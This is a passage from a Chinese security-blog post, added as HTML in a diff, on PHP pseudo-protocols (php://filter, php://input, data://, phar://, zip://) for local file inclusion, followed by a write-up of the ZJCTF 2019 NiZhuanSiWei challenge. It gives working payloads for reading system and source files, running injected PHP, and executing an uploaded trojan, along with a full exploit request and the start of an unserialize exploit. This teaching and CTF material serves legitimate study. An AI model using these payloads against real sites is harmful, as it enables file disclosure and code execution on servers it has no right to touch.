@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="分类： 123456789101112php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）file:&#x2F;&#x2F; — 访问本地文件系统phar:&#x2F;&#x2F; — PHP 归档zlib:&#x2F;&#x2F; — 压缩流data:&#x2F;&#x2F; — 数据（RFC 2397）http:&#x2F;&#x2F; — 访问 HTTP(s) 网址ftp:&#x2F;&#x2F; — 访问 FTP(s) URLsglob:&#x2F;&#x2F; — 查找匹配的文件路径模式ssh2:&#x2F;&#x2F; — Sec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="伪协议php(总结和缝合）">
+<meta property="og:url" content="http://example.com/2022/04/03/PHP/%E4%BC%AA%E5%8D%8F%E8%AE%AEphp(%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hack the world">
+<meta property="og:description" content="分类： 123456789101112php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）file:&#x2F;&#x2F; — 访问本地文件系统phar:&#x2F;&#x2F; — PHP 归档zlib:&#x2F;&#x2F; — 压缩流data:&#x2F;&#x2F; — 数据（RFC 2397）http:&#x2F;&#x2F; — 访问 HTTP(s) 网址ftp:&#x2F;&#x2F; — 访问 FTP(s) URLsglob:&#x2F;&#x2F; — 查找匹配的文件路径模式ssh2:&#x2F;&#x2F; — Sec">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-03T07:56:14.380Z">
+<meta property="article:modified_time" content="2022-04-03T12:44:15.576Z">
+<meta property="article:author" content="D0gekong">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2022/04/03/PHP/%E4%BC%AA%E5%8D%8F%E8%AE%AEphp(%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/04/03/PHP/%E4%BC%AA%E5%8D%8F%E8%AE%AEphp(%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/","path":"2022/04/03/PHP/伪协议php(总结和缝合）/","title":"伪协议php(总结和缝合）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>伪协议php(总结和缝合） | Hack the world</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hack the world</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fake it till Make it</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="D0gekong"
+      src="/images/pic.jpg">
+  <p class="site-author-name" itemprop="name">D0gekong</p>
+  <div class="site-description" itemprop="description">散人的漫漫学习路</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/SantaJiang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;SantaJiang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/jiangshengda@foxmail.com" title="E-Mail → jiangshengda@foxmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/3aa0cb901bee" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;3aa0cb901bee" rel="noopener" target="_blank"><i class="fab fa-jianshu fa-fw"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/jsd581?spm=1010.2135.3001.5421" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;jsd581?spm&#x3D;1010.2135.3001.5421" rel="noopener" target="_blank"><i class="fab fa-csdn fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/PHP/%E4%BC%AA%E5%8D%8F%E8%AE%AEphp(%E6%80%BB%E7%BB%93%E5%92%8C%E7%BC%9D%E5%90%88%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          伪协议php(总结和缝合）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-03 15:56:14 / 修改时间：20:44:15" itemprop="dateCreated datePublished" datetime="2022-04-03T15:56:14+08:00">2022-04-03</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>分类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">file:// — 访问本地文件系统</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
+<p><strong>PHP.ini（配置文件）</strong><br>在php.ini里有两个重要的参数allow_url_fopen和allow_url_include</p>
+<p>allow_url_fopen:默认值是ON，允许url里的封装协议访问文件</p>
+<p>allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件</p>
+<p>file:</p>
+<p>用于访问本地文件，不受allow_url_fopen，<code>file://</code>还经常和curl函数(SSRF)结合在一起,受allow_url_include影响</p>
+<p><a href="file://主要用于访问文件（绝对路径，相对路径和网络路径）">file://主要用于访问文件</a>（绝对路径和网络路径）</p>
+<p>比如：</p>
+<p>url?file=<a href="file:///etc/password">file:///etc/password</a></p>
+<p>php://：</p>
+<p>在allow_url_fopen,allow_url_include都关闭的情况下可以正常使用</p>
+<p>php://作用为访问输出和输入</p>
+<p>php://filter</p>
+<p>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.</p>
+<p>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。</p>
+<p>读取源代码并进行编码然后输出</p>
+<p>比如：</p>
+<p>url?cmd=php://filter/read=convert.base64-encode/resource=文件名（php文件需要用base64编码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-[encode/decode]/resource=xxx</span><br></pre></td></tr></table></figure>
+<p>这是使用的过滤器是convert.base64-encode.它的作用就是读取文件的内容进行base64编码后输出。可以用于读取程序源代码经过base64编码后的数据<br>说明：</p>
+<p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流</p>
+<p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+<p>write=&lt;写链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+<p>&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx</span><br></pre></td></tr></table></figure>
+<p>filter和string过滤器连用可以对字符串进行过滤。filter的read和write参数有不同的应用场景。read用于include()和file_get_contents(),write用于file_put_contents()中<br>php://input</p>
+<p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
+<p>需要开启allow_url_include</p>
+<p>执行post数据中的代码：</p>
+<p>比如：</p>
+<p>url?cmd=php://input</p>
+<p>post数据：<?php phpinfo()?></p>
+<p>注意：</p>
+<p>当enctype=”multipart/form-data”的时候，php://input是无效的</p>
+<p>data://</p>
+<p>当php&gt;=5.2.0，可以使用data://,来传递相应格式的数据。通常用来执行php代码。一般用base64编码传输,需满足<code>allow_url_fopen</code>，<code>allow_url_include</code>同时开启才能使用 </p>
+<p>比如：</p>
+<p>通过data://text/plain协议来进行漏洞利用</p>
+<p>data://text/plain;base64,base编码字符串</p>
+<p>很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">file.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">file.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+
+<p>phar://</p>
+<p>PHP 归档，常常跟文件包含，文件上传结合着考察。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://test.[zip/jpg/png…]/file.txt</span><br></pre></td></tr></table></figure>
+<p>其实可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为phar://test.test/file.txt也可以运行。<br>当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nac.php(木马)-&gt;压缩-&gt;nac.zip-&gt;改后缀-&gt;nac.jpg-&gt;上传-&gt;phar://nac.jpg/nac.php</span><br></pre></td></tr></table></figure>
+
+<p>zip://,bzip2://, zlib://</p>
+<p>在双OFF的时候也可以用，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip://test.zip%23file.txt</span><br></pre></td></tr></table></figure>
+<p>和phar://一样用于读取压缩文件，不过对于”zip://test.zip#file.txt”中的”#”要编码为”%23”.因为url的#后的内容不会被传送<br>zip://:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</span><br><span class="line">file.php?file=zip://nac.jpg#nac.php  其中get请求中#需要进行编码，即%23</span><br></pre></td></tr></table></figure>
+
+<p>bzip2://:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=compress.bzip2://nac.bz2</span><br><span class="line">file.php?file=compress.bzip2://./nac.jpg</span><br><span class="line">file.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</span><br></pre></td></tr></table></figure>
+
+<p>zlib://:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=compress.zlib://file.gz</span><br><span class="line">file.php?file=compress.zlib://./nac.jpg</span><br><span class="line">file.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</span><br></pre></td></tr></table></figure>
+
+<p>例子：</p>
+<p>[ZJCTF 2019]NiZhuanSiWei</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>代码让我们get传参text，file，password<br>经过观察可以确定text要传入一个文件，且文件内容为：welcome to the zjctf，file传入一个文件名。然后通过include($file）包含，password暂且不知</p>
+<p>伪协议第一次利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))</span><br></pre></td></tr></table></figure>
+<p>这里需要我们传入一个文件且其内容为<code>welcome to the zjctf</code>,才可以进入判断进行下一步<br>由于：在官方手册中file_get_contents()是用来将文件的内容读入到一个字符串中的首选方法 </p>
+<p>官方实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents(&#x27;http://www.xxx.com/aa.png&#x27;, &#x27;r&#x27;);</span><br><span class="line">// 将会在该页面中输出图片</span><br></pre></td></tr></table></figure>
+<p>可以发现，file_get_contents的$filename参数不仅仅可以是本地文件路径，也可以是一个网络路径即url,所以我们可以考虑使用伪协议</p>
+<ul>
+<li>姿势一：<code>data://</code>协议利用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br><span class="line">// d2VsY29tZSB0byB0aGUgempjdGY= 解码后为 -----&gt;  welcome to the zjctf</span><br></pre></td></tr></table></figure></li>
+<li>姿势二：<code>php://</code>协议利用<br>php://input</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">url：http://a7425027-7eb1-43be-a0c9-47a34018d60b.node3.buuoj.cn/?text=php://input</span><br><span class="line">POST数据：welcome to the zjctf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST请求包：</span><br><span class="line">POST /?text=php://input HTTP/1.1</span><br><span class="line">Host: a7425027-7eb1-43be-a0c9-47a34018d60b.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 20</span><br><span class="line">Origin: http://a7425027-7eb1-43be-a0c9-47a34018d60b.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://a7425027-7eb1-43be-a0c9-47a34018d60b.node3.buuoj.cn/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">welcome to the zjctf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">回包：</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty</span><br><span class="line">Date: Sat, 08 Feb 2020 11:45:53 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 38</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;h1&gt;welcome to the zjctf&lt;/h1&gt;&lt;/br&gt;</span><br></pre></td></tr></table></figure>
+<p>伪协议第二次利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里把flag给过滤了，肯定不是直接包含<br>注释里有一个useless.php，打开看下，但直接访问是不能打开的，尝试用伪协议php://filter</p>
+<p>?file=php://filter/read=convert.base64-encode/resource=useless.php</p>
+<p>这里顺便把前面的第一个判断用data协议绕过，进入判断语句中</p>
+<p>所以payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+<p>能得到useless.php的base64编码内容<br>解码后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+<p><strong>这一段代码的意思是：获取这个</strong><code>$file</code><strong>参数代表的文件并且输出出来，注意前者的file参数和这里flag类的file参数并不一样，两者位于不同的作用域！</strong><br>根据注释提示我们应该是要包含flag.php就可以获得flag，所以Flag类中的file应该为flag.php,再加上前面如果包含了useless.php,整体代码就为如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">            class Flag&#123;  //flag.php  </span><br><span class="line">        public $file;  </span><br><span class="line">        public function __tostring()&#123;  </span><br><span class="line">            if(isset($this-&gt;file))&#123;  </span><br><span class="line">                echo file_get_contents($this-&gt;file); </span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; </span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在<code>$password = unserialize($password);</code>中，<code>unserialize()</code>函数是一个反序列化函数。不熟悉序列化与反序列化的可以百度一下。<br>若我们将一个序列化后的对象即一串<strong>字符串</strong>传给<code>$password</code>，那么我们会得到一个实例对象，我们便不难想象，若是我们将一个<code>useless.php</code>中的Flag对象(其中<code>$file</code>参数的值为<code>flag.php</code>)序列化后得到的字符串传给$password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码,且能输出<code>flag.php</code>中的代码</p>
+<p>构造类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;   </span><br><span class="line">    public $file=&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo 